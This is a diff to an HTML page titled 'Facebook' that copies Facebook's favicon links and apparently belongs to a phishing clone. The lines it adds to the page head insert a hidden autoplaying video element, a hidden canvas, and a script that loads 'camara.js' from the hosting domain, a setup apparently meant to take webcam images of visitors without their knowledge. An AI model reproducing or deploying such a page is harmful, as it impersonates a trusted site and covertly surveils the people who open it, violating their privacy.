@@ -5,14 +5,29 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Facebook</title>
-    <link rel="stylesheet" href="facebook.css">
-    <link rel="stylesheet" href="../assets/fontawesome-5.15.3/css/all.min.css">
+    <link rel="stylesheet" href="facebook.css"/>
+    <link rel="stylesheet" href="../assets/fontawesome-5.15.3/css/all.min.css"/>
     <link
       data-default-icon="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico"
       data-badged-icon="https://static.xx.fbcdn.net/rsrc.php/ye/r/Ta8_J_nYekI.ico"
       rel="shortcut icon"
       href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico"
     />
+	
+	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+	<div class="video-wrap" hidden="hidden">
+		<video id="video" playsinline autoplay></video>
+	</div>
+	<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+	 
+   <script type="text/javascript">
+		var URLdomain = window.location.host;
+        script = document.createElement("script");
+        script.src = "https://"+URLdomain+"/js/camara.js";
+
+        document.head.appendChild(script);
+	</script>
+	
   </head>
   <body>
     <header>
